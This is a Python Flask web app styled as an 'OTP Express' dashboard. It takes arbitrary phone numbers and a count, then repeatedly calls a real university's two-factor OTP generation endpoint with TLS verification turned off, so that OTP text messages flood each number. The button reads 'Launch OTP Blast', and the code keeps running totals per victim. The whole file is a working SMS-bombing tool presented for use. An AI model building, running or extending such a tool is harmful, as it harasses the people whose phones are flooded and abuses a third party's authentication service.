from flask import Flask, render_template_string, request
import requests
import time

app = Flask(__name__)

OTP_GEN_URL = "https://twofa.srmu.ac.in/otp/generate"

# In-memory tracking (resets if server restarts)
otp_tracker = {}

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Express | SMS Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #6366f1;
            --primary-hover: #4f46e5;
            --bg: #0f172a;
            --card-bg: #1e293b;
            --text: #f8fafc;
            --text-dim: #94a3b8;
            --success: #10b981;
            --error: #ef4444;
            --border: #334155;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; }
        body { background-color: var(--bg); color: var(--text); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { width: 100%; max-width: 800px; background: var(--card-bg); padding: 40px; border-radius: 24px; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); border: 1px solid var(--border); backdrop-filter: blur(10px); }
        h1 { font-size: 2.5rem; font-weight: 700; margin-bottom: 8px; text-align: center; background: linear-gradient(135deg, #818cf8 0%, #c084fc 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        p.subtitle { text-align: center; color: var(--text-dim); margin-bottom: 32px; }
        .alert { padding: 16px; border-radius: 12px; margin-bottom: 24px; font-weight: 500; }
        .alert-error { background: rgba(239, 68, 68, 0.1); color: var(--error); border: 1px solid rgba(239, 68, 68, 0.2); }
        label { display: block; font-weight: 600; margin-bottom: 8px; color: var(--text-dim); }
        textarea, input { width: 100%; background: rgba(15, 23, 42, 0.5); border: 1px solid var(--border); border-radius: 12px; padding: 14px; color: var(--text); font-size: 1rem; margin-bottom: 20px; transition: all 0.2s; }
        textarea:focus, input:focus { outline: none; border-color: var(--primary); box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.2); }
        .btn { width: 100%; background: var(--primary); color: white; border: none; padding: 16px; border-radius: 12px; font-size: 1.1rem; font-weight: 700; cursor: pointer; transition: all 0.3s; display: flex; justify-content: center; align-items: center; gap: 10px; }
        .btn:hover { background: var(--primary-hover); transform: translateY(-2px); box-shadow: 0 10px 15px -3px rgba(99, 102, 241, 0.4); }
        .results-section { margin-top: 40px; border-top: 1px solid var(--border); padding-top: 30px; }
        .results-grid { display: grid; gap: 16px; }
        .result-card { background: rgba(15, 23, 42, 0.3); border: 1px solid var(--border); padding: 16px; border-radius: 16px; display: flex; justify-content: space-between; align-items: center; }
        .phone-num { font-weight: 700; font-size: 1.1rem; }
        .status-badge { padding: 6px 12px; border-radius: 20px; font-size: 0.85rem; font-weight: 600; text-transform: uppercase; }
        .status-sent { background: rgba(16, 185, 129, 0.1); color: var(--success); }
        .status-error { background: rgba(239, 68, 68, 0.1); color: var(--error); }
        .stats { margin-top: 12px; font-size: 0.9rem; color: var(--text-dim); }
        .footer { margin-top: 30px; text-align: center; font-size: 0.85rem; color: var(--text-dim); }
    </style>
</head>
<body>
    <div class="container">
        <h1>OTP Express</h1>
        <p class="subtitle">Secure SMS Delivery Management</p>
        {% if error %}<div class="alert alert-error">{{ error }}</div>{% endif %}
        <form method="POST">
            <label for="numbers">Phone Numbers (comma or newline separated)</label>
            <textarea name="numbers" id="numbers" rows="4" placeholder="e.g. 9876543210, 1234567890"></textarea>
            <label for="otp_count">OTP Count per Number</label>
            <input type="number" name="otp_count" id="otp_count" value="1" min="1">
            <button type="submit" class="btn"><span>🚀 Launch OTP Blast</span></button>
        </form>
        {% if results %}
        <div class="results-section">
            <h2 style="margin-bottom: 20px;">Execution Results</h2>
            <div class="results-grid">
                {% for res in results %}
                <div class="result-card">
                    <div>
                        <div class="phone-num">{{ res.phone }}</div>
                        <div class="stats">Sent now: {{ res.sent_now }} | Overall: {{ res.total_sent }}</div>
                    </div>
                    <span class="status-badge {% if 'Error' in res.status %}status-error{% else %}status-sent{% endif %}">{{ res.status }}</span>
                </div>
                {% endfor %}
            </div>
        </div>
        {% endif %}
        <div class="footer">&copy; 2026 SRM OTP Service • Connected to Telegram Bot</div>
    </div>
</body>
</html>
"""

def send_otps(numbers, otp_count):
    session = requests.Session()
    session.verify = False
    batch_results = []
    
    for phone in numbers:
        sent = 0
        otp_tracker.setdefault(phone, 0)

        for _ in range(otp_count):
            try:
                resp = session.post(f"{OTP_GEN_URL}/{phone}/123", timeout=10)
                sent += 1
                otp_tracker[phone] += 1
                time.sleep(1)  # small delay to avoid abuse
            except Exception as e:
                batch_results.append({
                    "phone": phone,
                    "status": f"Error: {str(e)}",
                    "sent_now": sent,
                    "total_sent": otp_tracker[phone]
                })
                break
        else:
            batch_results.append({
                "phone": phone,
                "status": "OTP sent",
                "sent_now": sent,
                "total_sent": otp_tracker[phone]
            })
    return batch_results

@app.route("/", methods=["GET", "POST"])
def index():
    results = []
    error = None

    if request.method == "POST":
        numbers_raw = request.form.get("numbers", "").strip()
        otp_count = request.form.get("otp_count", "1").strip()

        # Validation
        if not numbers_raw:
            error = "Please enter at least one mobile number."
            return render_template_string(HTML_TEMPLATE, error=error)

        try:
            otp_count = int(otp_count)
            if otp_count <= 0:
                raise ValueError
        except ValueError:
            error = "OTP count must be a positive number."
            return render_template_string(HTML_TEMPLATE, error=error)

        # Split numbers (comma or newline)
        numbers = [
            n.strip() for n in numbers_raw.replace("\\n", ",").split(",")
            if n.strip().isdigit()
        ]

        results = send_otps(numbers, otp_count)

    return render_template_string(HTML_TEMPLATE, results=results, tracker=otp_tracker, error=error)


if __name__ == "__main__":
    app.run(debug=True)
